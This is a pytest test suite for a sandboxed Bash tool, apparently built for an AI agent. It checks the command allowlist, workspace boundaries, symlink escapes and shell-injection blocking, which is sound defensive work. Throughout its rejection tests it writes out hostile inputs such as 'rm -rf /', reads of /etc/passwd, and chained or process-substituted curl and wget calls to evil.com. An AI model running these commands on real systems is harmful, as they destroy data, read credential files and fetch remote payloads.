"""
Unit tests for the Bash tool.

Tests:
- Allowlist enforcement (rejects disallowed commands)
- Sandbox enforcement (rejects commands outside workspace)
- Timeout handling
- Injection prevention (shell metacharacters)
- Successful execution (stdout/stderr capture)
- Exit code reporting
"""
import os
import subprocess
from unittest.mock import MagicMock, patch

import pytest

from src.tools.bash import DANGEROUS_CHARS, DEFAULT_ALLOWED_COMMANDS, MAX_TIMEOUT_SECONDS, Bash


@pytest.fixture
def workspace(tmp_path):
    """Create a temporary workspace directory."""
    ws = tmp_path / "workspace"
    ws.mkdir()
    return ws


@pytest.fixture
def bash_tool(workspace):
    """Create a Bash tool configured with the test workspace."""
    return Bash(config={"workspace_root": str(workspace)})


class TestBashMetadata:
    """Test tool metadata."""

    def test_name(self, bash_tool):
        assert bash_tool.name == "Bash"

    def test_description(self, bash_tool):
        assert "shell commands" in bash_tool.description.lower()

    def test_version(self, bash_tool):
        assert bash_tool.version == "1.0"

    def test_modifies_state(self, bash_tool):
        metadata = bash_tool.get_metadata()
        assert metadata.modifies_state is True

    def test_parameters_schema(self, bash_tool):
        schema = bash_tool.get_parameters_schema()
        assert schema["type"] == "object"
        assert "command" in schema["properties"]
        assert "working_directory" in schema["properties"]
        assert "timeout" in schema["properties"]
        assert "command" in schema["required"]


class TestAllowlistEnforcement:
    """Test that only allowed commands can be executed."""

    def test_allowed_command_pwd(self, bash_tool, workspace):
        result = bash_tool.execute(command="pwd", working_directory=str(workspace))
        assert result.success is True
        assert str(workspace) in result.result
        assert result.metadata["exit_code"] == 0

    def test_allowed_command_ls(self, bash_tool, workspace):
        result = bash_tool.execute(command="ls", working_directory=str(workspace))
        assert result.success is True
        assert result.metadata["exit_code"] == 0

    def test_allowed_command_mkdir(self, bash_tool, workspace):
        result = bash_tool.execute(
            command="mkdir test_dir",
            working_directory=str(workspace),
        )
        assert result.success is True
        assert (workspace / "test_dir").exists()

    def test_blocked_command_rm(self, bash_tool, workspace):
        result = bash_tool.execute(command="rm -rf /", working_directory=str(workspace))
        assert result.success is False
        assert "not in the allowed list" in result.error

    def test_blocked_command_curl(self, bash_tool, workspace):
        result = bash_tool.execute(command="curl http://example.com")
        assert result.success is False
        assert "not in the allowed list" in result.error

    def test_blocked_command_wget(self, bash_tool, workspace):
        result = bash_tool.execute(command="wget http://example.com")
        assert result.success is False
        assert "not in the allowed list" in result.error

    def test_blocked_command_python(self, bash_tool, workspace):
        result = bash_tool.execute(command="python -c 'import os; os.system(\"ls\")'")
        assert result.success is False
        assert result.error is not None
        # Could fail on allowlist or injection prevention
        assert "not in the allowed list" in result.error or "forbidden character" in result.error.lower()

    def test_blocked_command_sudo(self, bash_tool):
        result = bash_tool.execute(command="sudo ls")
        assert result.success is False
        assert "not in the allowed list" in result.error

    def test_blocked_command_chmod(self, bash_tool):
        result = bash_tool.execute(command="chmod 777 /etc/passwd")
        assert result.success is False
        assert result.error is not None
        assert "not in the allowed list" in result.error

    def test_allowed_commands_set(self):
        """Verify the default allowed set contains expected commands."""
        expected = {"npm", "npx", "node", "hardhat", "ls", "cat", "find", "mkdir", "pwd"}
        assert DEFAULT_ALLOWED_COMMANDS == expected

    def test_custom_allowlist(self, workspace):
        """Test that custom allowlist works."""
        tool = Bash(config={
            "workspace_root": str(workspace),
            "allowed_commands": ["echo", "pwd"],
        })
        # pwd should work
        result = tool.execute(command="pwd", working_directory=str(workspace))
        assert result.success is True

        # ls should be blocked
        result = tool.execute(command="ls", working_directory=str(workspace))
        assert result.success is False

    def test_command_with_path_prefix(self, bash_tool, workspace):
        """Commands with path prefixes must be rejected (bare names only)."""
        result = bash_tool.execute(
            command="/usr/bin/rm -rf /",
            working_directory=str(workspace),
        )
        assert result.success is False
        assert "bare name" in result.error.lower() or "not a path" in result.error.lower()

    def test_command_path_bypass_attempt(self, bash_tool, workspace):
        """Even allowed commands with paths should be rejected."""
        result = bash_tool.execute(
            command="/tmp/evil/ls",
            working_directory=str(workspace),
        )
        assert result.success is False
        assert "bare name" in result.error.lower() or "not a path" in result.error.lower()


class TestSandboxEnforcement:
    """Test that commands can only run within the workspace."""

    def test_valid_workspace_directory(self, bash_tool, workspace):
        result = bash_tool.execute(command="pwd", working_directory=str(workspace))
        assert result.success is True
        assert str(workspace) in result.result
        assert result.metadata["exit_code"] == 0

    def test_subdirectory_of_workspace(self, bash_tool, workspace):
        subdir = workspace / "subproject"
        subdir.mkdir()
        result = bash_tool.execute(command="pwd", working_directory=str(subdir))
        assert result.success is True
        assert str(subdir) in result.result

    def test_outside_workspace_rejected(self, bash_tool, tmp_path):
        # Create a directory outside workspace
        outside = tmp_path / "outside"
        outside.mkdir()
        result = bash_tool.execute(command="pwd", working_directory=str(outside))
        assert result.success is False
        assert "outside the sandbox" in result.error

    def test_root_directory_rejected(self, bash_tool):
        result = bash_tool.execute(command="pwd", working_directory="/")
        assert result.success is False
        assert "outside the sandbox" in result.error

    def test_home_directory_rejected(self, bash_tool):
        result = bash_tool.execute(command="pwd", working_directory=os.path.expanduser("~"))
        assert result.success is False
        assert result.error is not None
        assert "outside the sandbox" in result.error or "resolves outside" in result.error

    def test_default_to_workspace_root(self, bash_tool, workspace):
        """When no working_directory is specified, use workspace root."""
        result = bash_tool.execute(command="pwd")
        assert result.success is True
        assert str(workspace) in result.result

    def test_workspace_created_if_not_exists(self, tmp_path):
        """Workspace root is auto-created if it doesn't exist."""
        new_workspace = tmp_path / "new_workspace"
        tool = Bash(config={"workspace_root": str(new_workspace)})
        result = tool.execute(command="pwd")
        assert result.success is True
        assert new_workspace.exists()
        assert str(new_workspace) in result.result


class TestInjectionPrevention:
    """Test shell metacharacter injection prevention."""

    @pytest.mark.parametrize("char", list(DANGEROUS_CHARS))
    def test_dangerous_char_rejected(self, bash_tool, workspace, char):
        """Each dangerous character should be rejected."""
        if char in ("\n", "\r"):
            command = f"ls{char}rm -rf /"
        else:
            command = f"ls {char} cat /etc/passwd"
        result = bash_tool.execute(command=command, working_directory=str(workspace))
        assert result.success is False
        assert "forbidden character" in result.error.lower()

    def test_semicolon_injection(self, bash_tool, workspace):
        result = bash_tool.execute(command="ls; rm -rf /", working_directory=str(workspace))
        assert result.success is False
        assert "forbidden character" in result.error.lower()

    def test_pipe_injection(self, bash_tool, workspace):
        result = bash_tool.execute(command="ls | cat /etc/passwd", working_directory=str(workspace))
        assert result.success is False
        assert "forbidden character" in result.error.lower()

    def test_ampersand_injection(self, bash_tool, workspace):
        result = bash_tool.execute(command="ls & rm -rf /", working_directory=str(workspace))
        assert result.success is False
        assert "forbidden character" in result.error.lower()

    def test_dollar_injection(self, bash_tool, workspace):
        result = bash_tool.execute(command="ls $HOME", working_directory=str(workspace))
        assert result.success is False
        assert "forbidden character" in result.error.lower()

    def test_backtick_injection(self, bash_tool, workspace):
        result = bash_tool.execute(command="ls `whoami`", working_directory=str(workspace))
        assert result.success is False
        assert "forbidden character" in result.error.lower()

    def test_redirect_injection(self, bash_tool, workspace):
        result = bash_tool.execute(command="ls > /etc/passwd", working_directory=str(workspace))
        assert result.success is False
        assert "forbidden character" in result.error.lower()

    def test_newline_injection(self, bash_tool, workspace):
        result = bash_tool.execute(command="ls\nrm -rf /", working_directory=str(workspace))
        assert result.success is False
        assert "forbidden character" in result.error.lower()


class TestTimeoutHandling:
    """Test command timeout behavior."""

    def test_default_timeout(self, bash_tool):
        assert bash_tool.default_timeout == 120

    def test_custom_timeout(self, workspace):
        tool = Bash(config={
            "workspace_root": str(workspace),
            "default_timeout": 60,
        })
        assert tool.default_timeout == 60

    def test_max_timeout_cap(self, workspace):
        """Timeout should be capped at MAX_TIMEOUT_SECONDS."""
        tool = Bash(config={
            "workspace_root": str(workspace),
            "default_timeout": 9999,
        })
        assert tool.default_timeout == MAX_TIMEOUT_SECONDS

    def test_timeout_parameter(self, bash_tool, workspace):
        """Explicit timeout parameter should be respected."""
        # This should not timeout (1 second is plenty for pwd)
        result = bash_tool.execute(
            command="pwd",
            working_directory=str(workspace),
            timeout=1,
        )
        assert result.success is True
        assert result.metadata["timeout"] == 1
        assert str(workspace) in result.result

    @patch("src.tools._bash_helpers.subprocess.run")
    def test_timeout_expired(self, mock_run, bash_tool, workspace):
        """TimeoutExpired should be caught and reported."""
        mock_run.side_effect = subprocess.TimeoutExpired(cmd="sleep", timeout=1)
        result = bash_tool.execute(
            command="ls",
            working_directory=str(workspace),
            timeout=1,
        )
        assert result.success is False
        assert "timed out" in result.error


class TestSuccessfulExecution:
    """Test successful command execution and output capture."""

    def test_stdout_capture(self, bash_tool, workspace):
        # Create a test file
        (workspace / "test.txt").write_text("hello world")

        result = bash_tool.execute(
            command="cat test.txt",
            working_directory=str(workspace),
        )
        assert result.success is True
        assert "hello world" in result.result

    def test_exit_code_in_metadata(self, bash_tool, workspace):
        result = bash_tool.execute(command="pwd", working_directory=str(workspace))
        assert result.success is True
        assert result.metadata["exit_code"] == 0

    def test_stderr_on_failure(self, bash_tool, workspace):
        """Non-existent file should produce stderr."""
        result = bash_tool.execute(
            command="cat nonexistent_file.txt",
            working_directory=str(workspace),
        )
        assert result.success is False
        assert result.metadata["exit_code"] != 0
        assert result.metadata["stderr"] != ""

    def test_working_directory_in_metadata(self, bash_tool, workspace):
        result = bash_tool.execute(command="pwd", working_directory=str(workspace))
        assert result.metadata["working_directory"] == str(workspace)

    def test_command_in_metadata(self, bash_tool, workspace):
        result = bash_tool.execute(command="pwd", working_directory=str(workspace))
        assert result.metadata["command"] == "pwd"

    def test_find_command(self, bash_tool, workspace):
        (workspace / "a.txt").write_text("a")
        (workspace / "b.txt").write_text("b")
        result = bash_tool.execute(
            command="find . -name '*.txt'",
            working_directory=str(workspace),
        )
        assert result.success is True
        assert "a.txt" in result.result
        assert "b.txt" in result.result


class TestEdgeCases:
    """Test edge cases and error handling."""

    def test_empty_command(self, bash_tool, workspace):
        result = bash_tool.execute(command="", working_directory=str(workspace))
        assert result.success is False
        assert "non-empty string" in result.error

    def test_none_command(self, bash_tool, workspace):
        result = bash_tool.execute(command=None, working_directory=str(workspace))
        assert result.success is False
        assert "non-empty string" in result.error

    def test_whitespace_only_command(self, bash_tool, workspace):
        result = bash_tool.execute(command="   ", working_directory=str(workspace))
        assert result.success is False
        assert "non-empty string" in result.error

    @patch("src.tools._bash_helpers.subprocess.run")
    def test_command_not_found(self, mock_run, bash_tool, workspace):
        mock_run.side_effect = FileNotFoundError()
        result = bash_tool.execute(command="ls", working_directory=str(workspace))
        assert result.success is False
        assert "not found" in result.error.lower()

    @patch("src.tools._bash_helpers.subprocess.run")
    def test_permission_denied(self, mock_run, bash_tool, workspace):
        mock_run.side_effect = PermissionError()
        result = bash_tool.execute(command="ls", working_directory=str(workspace))
        assert result.success is False
        assert "permission denied" in result.error.lower()

    def test_quoted_arguments(self, bash_tool, workspace):
        """Commands with quoted arguments should work."""
        (workspace / "file with spaces.txt").write_text("test content")
        result = bash_tool.execute(
            command='cat "file with spaces.txt"',
            working_directory=str(workspace),
        )
        assert result.success is True
        assert "test content" in result.result

    @patch("src.tools._bash_helpers.subprocess.run")
    def test_long_output_truncation(self, mock_run, bash_tool, workspace):
        """Very long output should be truncated."""
        long_output = "x" * 60000
        mock_run.return_value = MagicMock(
            returncode=0,
            stdout=long_output,
            stderr="",
        )
        result = bash_tool.execute(command="ls", working_directory=str(workspace))
        assert result.success is True
        assert len(result.result) < 60000
        assert "truncated" in result.result

    def test_invalid_timeout_type(self, bash_tool, workspace):
        """Invalid timeout type should use default."""
        result = bash_tool.execute(
            command="pwd",
            working_directory=str(workspace),
            timeout="invalid",
        )
        assert result.success is True
        assert result.metadata["timeout"] == bash_tool.default_timeout
        assert str(workspace) in result.result


class TestSymlinkSandboxProtection:
    """Tests for symlink escape and path traversal protections.

    Verifies that resolved paths (after following symlinks) are checked
    against the workspace boundary, preventing sandbox escapes via:
    - Symlinks pointing outside the workspace
    - Relative path traversal in command arguments
    - Absolute paths outside the workspace
    - Legitimate symlinks within the workspace (should be allowed)
    """

    def test_symlink_cwd_escape_blocked(self, workspace, tmp_path):
        """Symlink as working directory pointing outside workspace is blocked."""
        outside_dir = tmp_path / "outside"
        outside_dir.mkdir()
        symlink_dir = workspace / "escape_link"
        symlink_dir.symlink_to(outside_dir)

        tool = Bash(config={"workspace_root": str(workspace)})
        result = tool.execute(
            command="ls",
            working_directory=str(symlink_dir),
        )
        assert result.success is False
        assert "resolves outside the sandbox" in result.error

    def test_symlink_to_etc_blocked(self, workspace):
        """Symlink pointing to /etc is blocked as working directory."""
        etc_link = workspace / "etc_link"
        try:
            etc_link.symlink_to("/etc")
        except OSError:
            pytest.skip("Cannot create symlink to /etc")

        tool = Bash(config={"workspace_root": str(workspace)})
        result = tool.execute(
            command="ls",
            working_directory=str(etc_link),
        )
        assert result.success is False
        assert "resolves outside the sandbox" in result.error

    def test_relative_path_traversal_in_args_blocked(self, workspace):
        """Relative path traversal (../) in command arguments is blocked."""
        tool = Bash(config={"workspace_root": str(workspace)})
        result = tool.execute(
            command="cat ../../../etc/passwd",
            working_directory=str(workspace),
        )
        assert result.success is False
        assert "resolves outside the sandbox" in result.error

    def test_absolute_path_outside_workspace_in_args_blocked(self, workspace):
        """Absolute path outside workspace in command arguments is blocked."""
        tool = Bash(config={"workspace_root": str(workspace)})
        result = tool.execute(
            command="cat /etc/passwd",
            working_directory=str(workspace),
        )
        assert result.success is False
        assert "resolves outside the sandbox" in result.error

    def test_symlink_arg_escape_blocked(self, workspace, tmp_path):
        """Symlink in command argument resolving outside workspace is blocked."""
        outside_file = tmp_path / "secret.txt"
        outside_file.write_text("secret data")
        symlink_file = workspace / "secret_link.txt"
        symlink_file.symlink_to(outside_file)

        tool = Bash(config={"workspace_root": str(workspace)})
        result = tool.execute(
            command="cat secret_link.txt",
            working_directory=str(workspace),
        )
        assert result.success is False
        assert "resolves outside the sandbox" in result.error

    def test_legitimate_symlink_within_workspace_allowed(self, workspace):
        """Symlink pointing to another location within workspace is allowed."""
        sub_dir = workspace / "subdir"
        sub_dir.mkdir()
        target_file = sub_dir / "data.txt"
        target_file.write_text("legitimate data")
        symlink_file = workspace / "data_link.txt"
        symlink_file.symlink_to(target_file)

        tool = Bash(config={"workspace_root": str(workspace)})
        result = tool.execute(
            command="cat data_link.txt",
            working_directory=str(workspace),
        )
        assert result.success is True
        assert "legitimate data" in result.result

    def test_legitimate_symlink_dir_within_workspace_allowed(self, workspace):
        """Symlink directory within workspace pointing to workspace subdir is allowed."""
        real_dir = workspace / "real_subdir"
        real_dir.mkdir()
        (real_dir / "file.txt").write_text("content in subdir")
        link_dir = workspace / "linked_subdir"
        link_dir.symlink_to(real_dir)

        tool = Bash(config={"workspace_root": str(workspace)})
        result = tool.execute(
            command="ls",
            working_directory=str(link_dir),
        )
        assert result.success is True
        assert "file.txt" in result.result

    def test_nested_symlink_escape_blocked(self, workspace, tmp_path):
        """Nested symlink chain that ultimately escapes workspace is blocked."""
        outside_dir = tmp_path / "outside_nested"
        outside_dir.mkdir()
        # Create chain: workspace/link1 -> workspace/link2 -> outside
        link2 = workspace / "link2"
        link2.symlink_to(outside_dir)
        link1 = workspace / "link1"
        link1.symlink_to(link2)

        tool = Bash(config={"workspace_root": str(workspace)})
        result = tool.execute(
            command="ls",
            working_directory=str(link1),
        )
        assert result.success is False
        assert "resolves outside the sandbox" in result.error

    def test_dot_dot_traversal_multiple_levels(self, workspace):
        """Multiple levels of ../ traversal are blocked."""
        deep_dir = workspace / "a" / "b" / "c"
        deep_dir.mkdir(parents=True)

        tool = Bash(config={"workspace_root": str(workspace)})
        result = tool.execute(
            command="cat ../../../../etc/hostname",
            working_directory=str(deep_dir),
        )
        assert result.success is False
        assert "resolves outside the sandbox" in result.error

    def test_normal_operations_still_work(self, workspace):
        """Regression: normal operations within workspace still function."""
        sub = workspace / "project"
        sub.mkdir()
        (sub / "hello.txt").write_text("hello world")

        tool = Bash(config={"workspace_root": str(workspace)})

        # ls works
        result = tool.execute(command="ls", working_directory=str(sub))
        assert result.success is True
        assert "hello.txt" in result.result

        # cat works with workspace-internal path
        result = tool.execute(command="cat hello.txt", working_directory=str(sub))
        assert result.success is True
        assert "hello world" in result.result

        # pwd works
        result = tool.execute(command="pwd", working_directory=str(sub))
        assert result.success is True
        assert str(sub) in result.result

        # mkdir works
        result = tool.execute(command="mkdir newdir", working_directory=str(sub))
        assert result.success is True
        assert (sub / "newdir").exists()

    def test_flags_not_treated_as_paths(self, workspace):
        """Flags (arguments starting with -) are not checked as paths."""
        tool = Bash(config={"workspace_root": str(workspace)})
        result = tool.execute(
            command="ls -la",
            working_directory=str(workspace),
        )
        assert result.success is True
        assert result.metadata["exit_code"] == 0


class TestShellModeCommandChaining:
    """Tests for shell_mode command chaining validation.

    Verifies that when shell_mode=True, ALL commands in a chained pipeline
    are validated against the allowlist — not just the first command.
    """

    @pytest.fixture
    def shell_tool(self, workspace):
        """Create a Bash tool with shell_mode enabled."""
        return Bash(config={
            "workspace_root": str(workspace),
            "shell_mode": True,
        })

    # --- Allowed commands still work ---

    def test_single_allowed_command(self, shell_tool, workspace):
        """Single allowed command works in shell mode."""
        result = shell_tool.execute(command="ls", working_directory=str(workspace))
        assert result.success is True
        assert result.metadata["exit_code"] == 0

    def test_pipe_between_allowed_commands(self, shell_tool, workspace):
        """Pipe between two allowed commands works."""
        (workspace / "test.txt").write_text("hello\nworld\n")
        result = shell_tool.execute(
            command="cat test.txt | cat",
            working_directory=str(workspace),
        )
        assert result.success is True
        assert "hello" in result.result

    def test_semicolon_between_allowed_commands(self, shell_tool, workspace):
        """Semicolon between two allowed commands works."""
        result = shell_tool.execute(
            command="pwd ; ls",
            working_directory=str(workspace),
        )
        assert result.success is True
        assert str(workspace) in result.result

    def test_and_chain_allowed_commands(self, shell_tool, workspace):
        """&& between two allowed commands works."""
        result = shell_tool.execute(
            command="pwd && ls",
            working_directory=str(workspace),
        )
        assert result.success is True
        assert str(workspace) in result.result

    def test_or_chain_allowed_commands(self, shell_tool, workspace):
        """|| between two allowed commands works."""
        result = shell_tool.execute(
            command="pwd || ls",
            working_directory=str(workspace),
        )
        assert result.success is True
        assert str(workspace) in result.result

    # --- Disallowed commands in pipeline are blocked ---

    def test_pipe_to_disallowed_command_blocked(self, shell_tool, workspace):
        """Pipe to a disallowed command is blocked."""
        result = shell_tool.execute(
            command="ls | rm -rf /",
            working_directory=str(workspace),
        )
        assert result.success is False
        assert "not in the allowed list" in result.error

    def test_semicolon_to_disallowed_command_blocked(self, shell_tool, workspace):
        """Semicolon to a disallowed command is blocked."""
        result = shell_tool.execute(
            command="ls ; rm -rf /",
            working_directory=str(workspace),
        )
        assert result.success is False
        assert "not in the allowed list" in result.error

    def test_and_chain_to_disallowed_command_blocked(self, shell_tool, workspace):
        """&& to a disallowed command is blocked."""
        result = shell_tool.execute(
            command="ls && curl http://evil.com",
            working_directory=str(workspace),
        )
        assert result.success is False
        assert "not in the allowed list" in result.error

    def test_or_chain_to_disallowed_command_blocked(self, shell_tool, workspace):
        """|| to a disallowed command is blocked."""
        result = shell_tool.execute(
            command="ls || wget http://evil.com",
            working_directory=str(workspace),
        )
        assert result.success is False
        assert "not in the allowed list" in result.error

    def test_disallowed_first_in_pipe(self, shell_tool, workspace):
        """Disallowed command as first in a pipeline is blocked."""
        result = shell_tool.execute(
            command="curl http://evil.com | cat",
            working_directory=str(workspace),
        )
        assert result.success is False
        assert "not in the allowed list" in result.error

    def test_disallowed_middle_of_chain(self, shell_tool, workspace):
        """Disallowed command in the middle of a chain is blocked."""
        result = shell_tool.execute(
            command="ls ; rm -rf / ; pwd",
            working_directory=str(workspace),
        )
        assert result.success is False
        assert "not in the allowed list" in result.error

    # --- Command substitution blocked ---

    def test_dollar_paren_substitution_blocked(self, shell_tool, workspace):
        """$() command substitution is blocked."""
        result = shell_tool.execute(
            command="cat $(ls)",
            working_directory=str(workspace),
        )
        assert result.success is False
        assert "command substitution" in result.error.lower()

    def test_backtick_substitution_blocked(self, shell_tool, workspace):
        """Backtick command substitution is blocked."""
        result = shell_tool.execute(
            command="cat `ls`",
            working_directory=str(workspace),
        )
        assert result.success is False
        assert "command substitution" in result.error.lower()

    # --- Path-based command names blocked ---

    def test_path_command_in_pipeline_blocked(self, shell_tool, workspace):
        """Path-based command name in pipeline is blocked."""
        result = shell_tool.execute(
            command="ls | /usr/bin/evil",
            working_directory=str(workspace),
        )
        assert result.success is False
        assert "bare name" in result.error.lower()

    # --- Shell mode metadata ---

    def test_shell_mode_description(self, shell_tool):
        """Shell mode description mentions shell mode."""
        metadata = shell_tool.get_metadata()
        assert "shell mode" in metadata.description.lower()

    def test_shell_mode_schema_description(self, shell_tool):
        """Shell mode parameter description mentions redirections."""
        schema = shell_tool.get_parameters_schema()
        cmd_desc = schema["properties"]["command"]["description"]
        assert "redirection" in cmd_desc.lower()

    # --- Process substitution blocked ---

    def test_process_substitution_input_blocked(self, shell_tool, workspace):
        """Process substitution <() is blocked."""
        result = shell_tool.execute(
            command="cat <(curl http://evil.com/payload)",
            working_directory=str(workspace),
        )
        assert result.success is False
        assert "process substitution" in result.error.lower()

    def test_process_substitution_output_blocked(self, shell_tool, workspace):
        """Process substitution >() is blocked."""
        result = shell_tool.execute(
            command="ls >(cat)",
            working_directory=str(workspace),
        )
        assert result.success is False
        assert "process substitution" in result.error.lower()

    # --- Stderr redirection blocked ---

    def test_stderr_redirect_blocked(self, shell_tool, workspace):
        """Stderr redirection 2> is blocked."""
        result = shell_tool.execute(
            command="ls 2>/tmp/output",
            working_directory=str(workspace),
        )
        assert result.success is False
        assert "stderr redirection" in result.error.lower()

    def test_stderr_stdout_redirect_blocked(self, shell_tool, workspace):
        """Combined stderr+stdout redirection &> is blocked."""
        result = shell_tool.execute(
            command="ls &>/tmp/output",
            working_directory=str(workspace),
        )
        assert result.success is False
        assert "stderr redirection" in result.error.lower()


class TestShellCommandParsing:
    """Test _split_shell_commands with various edge cases for escape/quote handling."""

    def test_single_quoted_pipe_not_split(self):
        """Pipe inside single quotes should not split command."""
        from src.tools.bash import _split_shell_commands
        result = _split_shell_commands("echo 'hello|world'")
        assert len(result) == 1
        assert "hello|world" in result[0]

    def test_double_quoted_pipe_not_split(self):
        """Pipe inside double quotes should not split command."""
        from src.tools.bash import _split_shell_commands
        result = _split_shell_commands('echo "hello|world"')
        assert len(result) == 1
        assert "hello|world" in result[0]

    def test_escaped_pipe_not_split(self):
        """Escaped pipe should not split command."""
        from src.tools.bash import _split_shell_commands
        result = _split_shell_commands("echo hello\\|world")
        assert len(result) == 1
        assert "|" in result[0]

    def test_single_quote_toggle(self):
        """Single quotes toggle in/out correctly."""
        from src.tools.bash import _split_shell_commands
        result = _split_shell_commands("echo 'test' | cat")
        assert len(result) == 2
        assert "'test'" in result[0]

    def test_double_quote_toggle(self):
        """Double quotes toggle in/out correctly."""
        from src.tools.bash import _split_shell_commands
        result = _split_shell_commands('echo "test" | cat')
        assert len(result) == 2
        assert '"test"' in result[0]

    def test_escape_in_double_quotes(self):
        """Backslash escape works in double quotes."""
        from src.tools.bash import _split_shell_commands
        result = _split_shell_commands('echo "hello\\"world"')
        assert len(result) == 1
        assert '\\"' in result[0]

    def test_no_escape_in_single_quotes(self):
        """Backslash has no special meaning in single quotes."""
        from src.tools.bash import _split_shell_commands
        result = _split_shell_commands("echo 'hello\\nworld'")
        assert len(result) == 1
        assert "\\n" in result[0]

    def test_and_operator_split(self):
        """&& operator splits commands correctly."""
        from src.tools.bash import _split_shell_commands
        result = _split_shell_commands("ls && pwd")
        assert len(result) == 2
        assert "ls" in result[0]
        assert "pwd" in result[1]

    def test_or_operator_split(self):
        """|| operator splits commands correctly."""
        from src.tools.bash import _split_shell_commands
        result = _split_shell_commands("ls || pwd")
        assert len(result) == 2
        assert "ls" in result[0]
        assert "pwd" in result[1]

    def test_semicolon_split(self):
        """Semicolon splits commands correctly."""
        from src.tools.bash import _split_shell_commands
        result = _split_shell_commands("ls ; pwd")
        assert len(result) == 2
        assert "ls" in result[0]
        assert "pwd" in result[1]

    def test_nested_quotes(self):
        """Single quotes inside double quotes preserved."""
        from src.tools.bash import _split_shell_commands
        result = _split_shell_commands("""echo "it's working" """)
        assert len(result) == 1
        assert "it's" in result[0]
